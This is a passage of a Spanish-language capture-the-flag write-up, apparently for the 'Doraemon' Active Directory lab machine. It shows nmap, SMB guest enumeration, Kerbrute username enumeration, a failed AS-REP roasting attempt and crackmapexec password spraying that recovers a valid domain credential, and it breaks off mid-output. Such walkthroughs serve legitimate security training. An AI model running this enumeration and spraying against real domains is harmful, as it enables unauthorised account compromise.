+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49670/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49671/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49673/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49676/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49686/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49708/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb-os-discovery: 
+</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#ae81ff">2016</span> Datacenter <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Datacenter 6.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Computer name: WIN-VRU3GG3DPLJ
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: WIN-VRU3GG3DPLJ<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Domain name: DORAEMON.THL
+</span></span><span style="display:flex;"><span>|   Forest name: DORAEMON.THL
+</span></span><span style="display:flex;"><span>|   FQDN: WIN-VRU3GG3DPLJ.DORAEMON.THL
+</span></span><span style="display:flex;"><span>|_  System time: 2025-04-09T14:11:34+02:00
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-04-09T12:11:34
+</span></span><span style="display:flex;"><span>|_  start_date: 2025-04-09T11:59:21
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: required
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -8h40m01s, deviation: 1h09m16s, median: -8h00m01s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 70.38 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>En efecto, estamos contra una máquina <strong>Active Directory</strong>. Podemos ver el dominio del AD, siendo <strong>DORAEMON.THL</strong>, así que regístralo en el <code>/etc/hosts</code>.</p>
+<p>Además, vemos que el <strong>servicio SMB</strong> está aceptando el <strong>usuario guest</strong> como autenticación. Entonces, vamos a empezar por el <strong>servicio SMB</strong> para ver que podemos encontrar.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="SMB">Enumeración de Servicio SMB</h3>
+<p>Veamos qué nos reporta la herramienta <strong>crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.10.5
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Datacenter <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:DORAEMON.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Confirmamos el dominio, la versión del SO que se está usando y que son necesarias credenciales de acceso para loguearse al <strong>servicio SMB</strong>.</p>
+<p>Veamos si podemos ver los recursos compartidos con el <strong>usuario guest</strong>, como lo menciono el escaneo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.10.5 -u <span style="color:#e6db74">&#39;guest&#39;</span> --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">0</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.10.5:445	Name: DORAEMON.THL        	Status: Authenticated
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Admin remota
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Recurso predeterminado
+</span></span><span style="display:flex;"><span>	gorrocoptero                                      	READ ONLY	
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	IPC remota
+</span></span><span style="display:flex;"><span>	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>	SYSVOL                                            	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>	Users                                             	NO ACCESS	
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Funciona.</p>
+<p>Veamos qué hay dentro del directorio <strong>gorrocoptero</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.10.5 -u <span style="color:#e6db74">&#39;guest&#39;</span> -r gorrocoptero --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">0</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.10.5:445	Name: DORAEMON.THL        	Status: Authenticated
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Admin remota
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Recurso predeterminado
+</span></span><span style="display:flex;"><span>	gorrocoptero                                      	READ ONLY	
+</span></span><span style="display:flex;"><span>	./gorrocoptero
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Oct  <span style="color:#ae81ff">2</span> 03:17:24 2024	.
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Oct  <span style="color:#ae81ff">2</span> 03:17:24 2024	..
+</span></span><span style="display:flex;"><span>	fr--r--r--             <span style="color:#ae81ff">1843</span> Wed Oct  <span style="color:#ae81ff">2</span> 03:18:00 2024	kedadawapa.txt
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	IPC remota
+</span></span><span style="display:flex;"><span>	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>	SYSVOL                                            	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>	Users                                             	NO ACCESS	
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Tenemos un archivo de texto.</p>
+<p>Vamos a descargarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.10.5 -u <span style="color:#e6db74">&#39;guest&#39;</span> --download gorrocoptero/kedadawapa.txt --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">0</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting download: gorrocoptero<span style="color:#ae81ff">\k</span>edadawapa.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">1843</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File output to: /home/berserkwings/Escritorio/TheHackersLabs/Doraemon/content/192.168.10.5-gorrocoptero_kedadawapa.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Y veamos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat 192.168.10.5-gorrocoptero_kedadawapa.txt
+</span></span><span style="display:flex;"><span>Atención al grupo especial Dorayaki1 de Estepona
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Doraemon: Â¡Hola, chicos! Â¿QuÃ© les parece si vamos a comer dorayakis hoy?
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Nobita: Â¡SÃ­! Â¡Me encantan los dorayakis! Peroâ€¦ Â¿dÃ³nde vamos a conseguirlos?
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Shizuka: He oÃ­do que hay una nueva tienda de dorayakis en la esquina de la calle. Â¡Dicen que son los mejores de la ciudad!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Suneo: Oh, por favor. Siempre hay algo nuevo. No puedo esperar para probarlos. Â¡Espero que sean mÃ¡s grandes que los de la tienda anterior!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Gigante: Â¡Quiero que sean enormes! Â¡Y que tengan mucho relleno! Si no, Â¡no me importa ir!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Doraemon: Bueno, podemos pedirle a Nobita que use el poder de la mÃ¡quina de tiempo para viajar al futuro y traernos unos dorayakis del aÃ±o 3000.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Nobita: Â¡Espera! No sÃ© si deberÃ­a usar la mÃ¡quina. La Ãºltima vez que lo hice, terminÃ© en un lugar lleno de robots rarosâ€¦
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Shizuka: No te preocupes, Nobita. Solo vamos a la tienda. No necesitamos ir al futuro. Â¡Podemos ir a pie!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Suneo: Eso suena aburrido. Â¿Por quÃ© no hacemos una carrera? El primero en llegar a la tienda puede elegir el sabor de los dorayakis.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Gigante: Â¡Me encanta esa idea! Pero, Â¡tendrÃ¡s que correr rÃ¡pido para ganarme, Suneo!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Doraemon: Â¿Y si mejor vamos todos juntos? AsÃ­ disfrutamos del camino. AdemÃ¡s, Â¡puedo usar el futurÃ³fono para pedir un montÃ³n de dorayakis para que nos estÃ©n esperando!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Nobita: Â¡Esa es una gran idea, Doraemon! AsÃ­ no tengo que correr y me aseguro de que haya suficiente para todos.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Shizuka: Â¡Perfecto! Entonces, Â¡vamos a la tienda de dorayakis!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Suneo: Â¡SÃ­! Â¡Dorayakis, allÃ¡ vamos!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Gigante: Â¡No se olviden de mÃ­! Â¡Voy a ganar!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>- Doraemon: Â¡A comer dorayakis!
+</span></span></code></pre></div><p>Ok, podemos ignorar los mensajes que se están mandando y enfoquemonos en los nombres del mensaje.</p>
+<p>Los guardaremos en un archivo, quedando de esta manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat AD_users.txt
+</span></span><span style="display:flex;"><span>administrador
+</span></span><span style="display:flex;"><span>guest
+</span></span><span style="display:flex;"><span>invitado
+</span></span><span style="display:flex;"><span>Nobita
+</span></span><span style="display:flex;"><span>Shizuka
+</span></span><span style="display:flex;"><span>Suneo
+</span></span><span style="display:flex;"><span>Gigante
+</span></span><span style="display:flex;"><span>Doraemon
+</span></span><span style="display:flex;"><span>Dorayaki1
+</span></span><span style="display:flex;"><span>Estepona
+</span></span></code></pre></div><p>Agregue algunos usuarios conocidos que son por defecto.</p>
+<p>Con esto, podemos hacer algunas cosillas.</p>
+<h3 id="Kerberos">Enumeración de Usuarios de Servicio Kerberos</h3>
+<p>La idea es identificar a los usuarios que están registrados en la máquina víctima, y eso lo podemos hacer con la herramienta <strong>Kerbrute</strong>.</p>
+<p>Aquí la puedes obtener:</p>
+<ul>
+<li><a href="https://github.com/ropnop/kerbrute" target="_blank">Repositorio de ropnop: kerbrute</a></li>
+</ul>
+<p>Veamos cuáles existen:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./kerbrute_linux_amd64 userenum -d DORAEMON.THL --dc 192.168.10.5 AD_users.txt
+</span></span><span style="display:flex;"><span>    __             __               __     
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 04/09/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  	192.168.10.5:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 Shizuka@DORAEMON.THL
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 administrador@DORAEMON.THL
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 Suneo@DORAEMON.THL
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 invitado@DORAEMON.THL
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 Doraemon@DORAEMON.THL
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 Nobita@DORAEMON.THL
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 Gigante@DORAEMON.THL
+</span></span><span style="display:flex;"><span>2025/04/09 17:50:18 &gt;  Done! Tested <span style="color:#ae81ff">10</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">7</span> valid<span style="color:#f92672">)</span> in 0.054 seconds
+</span></span></code></pre></div><p>Excelente, los únicos usuarios que no existen son <strong>Dorayaki1 y Estepona</strong>.</p>
+<p>Ahora bien, podríamos intentar aplicar el <strong>ataque AS-REP Roasting</strong>, pero no funcionará:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-GetNPUsers -no-pass -usersfile AD_users.txt DORAEMON.THL/
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  now <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span> + datetime.timedelta<span style="color:#f92672">(</span>days<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User Administrador doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User administrador doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User invitado doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Nobita doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User nobita doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Shizuka doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User shizuka doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Suneo doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User suneo doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Gigante doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User gigante doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Doraemon doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User doraemon doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Ningún usuario tiene activo el permiso <strong>UF_DONT_REQUIRE_PREAUTH</strong>.</p>
+<p>Lo que sí podemos probar, es si algún usuario utilizo su mismo nombre como contraseña y podemos utilizar los que ya tenemos, siendo este el <strong>ataque Password Spraying</strong>.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="PasswordS">Aplicando Password Spraying con crackmapexec</h3>
+<p>Aplicaremos <strong>Password Spraying</strong> con <strong>crackmapexec</strong> y escogeremos cada usuario de la lista de usuarios.</p>
+<p>Observa que con el nombre del <strong>grupo Dorayaki1</strong>, sirve para algunos usuarios, pero el que me llama la atención es el <strong>usuario Doraemon</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.10.5 -u AD_users.txt -p <span style="color:#e6db74">&#39;Dorayaki1&#39;</span> --continue-on-success --no-brute
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Datacenter <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:DORAEMON.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\a</span>dministrador:Dorayaki1 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\g</span>uest:Dorayaki1 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\i</span>nvitado:Dorayaki1 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\N</span>obita:Dorayaki1 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\S</span>hizuka:Dorayaki1 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\S</span>uneo:Dorayaki1 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\G</span>igante:Dorayaki1 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.10.5    <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DORAEMON.THL<span style="color:#ae81ff">\D</span>oraemon:Dorayaki1 
